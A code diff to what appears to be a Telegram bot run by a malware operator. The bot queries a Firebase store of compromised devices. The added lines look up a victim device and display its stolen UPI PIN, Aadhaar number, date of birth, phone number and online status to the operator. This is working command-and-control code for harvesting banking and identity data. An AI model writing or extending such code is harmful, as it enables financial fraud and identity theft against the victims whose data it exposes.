@@ -122,7 +122,6 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
     global firebase_base, selected_device_id
     if context.args:
-        # Yahan search logic hai jo tumne manga tha
         search_query = " ".join(context.args).lower()
         try:
             response = requests.get(f"{firebase_base}/user_data.json")
@@ -132,14 +131,21 @@ async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if client_id.lower() == search_query or str(info.get('d_name', '')).lower() == search_query or str(info.get('phoneNumber', '')).lower() == search_query:
                     found_id = client_id
                     break
+            
             if found_id:
-                # ... (Device milne par details dikhane ka code)
+                selected_device_id = found_id
+                details = requests.get(f"{firebase_base}/user_data/{found_id}.json").json() or {}
+                login_resp = requests.get(f"{firebase_base}/All_Users/Login/{found_id}.json")
+                login_data = login_resp.json() if login_resp.status_code == 200 and login_resp.json() else {}
+                pin, adhar, dob = login_data.get('pin', 'N/A'), login_data.get('Adhar', 'N/A'), login_data.get('dob', 'N/A')
+                status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
+                msg = (f"📱 {details.get('d_name', 'Unknown')}\n🆔 {found_id}\n📞 {details.get('phoneNumber', 'Unknown')}\n🔋 {details.get('battery', 'N/A')}%\n📌 UPI Pin: {pin}\n💳 Adhar: {adhar}\n📅 DOB: {dob}\n{status}\n\n✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+                await update.message.reply_text(msg)
             else:
                 await update.message.reply_text(f"❌ Device '{search_query}' nahi mili.")
         except Exception as e:
             await update.message.reply_text(f"Error: {str(e)}")
     else:
-        # Agar koi argument nahi diya, toh purani list dikha dega
         await show_device_page(update, context, 0)
 
 async def show_device_page(update, context, page):
